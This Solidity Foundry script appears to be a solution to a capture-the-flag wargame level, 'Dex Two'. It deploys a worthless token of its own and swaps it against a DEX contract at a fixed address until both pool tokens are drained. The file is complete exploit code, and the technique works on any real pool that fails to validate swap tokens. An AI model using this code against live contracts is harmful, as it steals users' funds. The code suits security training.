// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DexTwo, IERC20} from "../src/DEX2.sol";

contract Hacker {
    DexTwo code;
    IERC20 ETH;
    IERC20 DAI;
    IERC20 g;

    constructor(DexTwo _code, IERC20 _g) {
        code = _code;
        ETH = IERC20(code.token1());
        DAI = IERC20(code.token2());
        g = _g;
    }

    function attack() external {
        ETH.transferFrom(msg.sender, address(this), 10);
        DAI.transferFrom(msg.sender, address(this), 10);

        g.transfer(address(code), 1);

        g.approve(address(code), 10);

        code.swap(address(g), address(ETH), 1);
        code.swap(address(g), address(DAI), 2);

        require(ETH.balanceOf(address(code)) == 0);
        require(DAI.balanceOf(address(code)) == 0);
    }
}

contract Token is ERC20 {
    constructor() ERC20("ok", "ok") {}

    function mint(address _to, uint256 amount) public {
        _mint(_to, amount);
    }
}

contract DEXSolution is Script {
    DexTwo public code = DexTwo(0x0603311feF71C32C772aF35F8110E909166C9aFB);
    Token public g;

    function run() external {
        IERC20 ETH = IERC20(code.token1());
        IERC20 DAI = IERC20(code.token2());
        vm.startBroadcast(vm.envUint("PRIV"));
        g = new Token();
        Hacker hacker = new Hacker(code, g);
        ETH.approve(address(hacker), 10);
        DAI.approve(address(hacker), 10);
        g.mint(address(hacker), 10);
        hacker.attack();
        vm.stopBroadcast();
    }
}
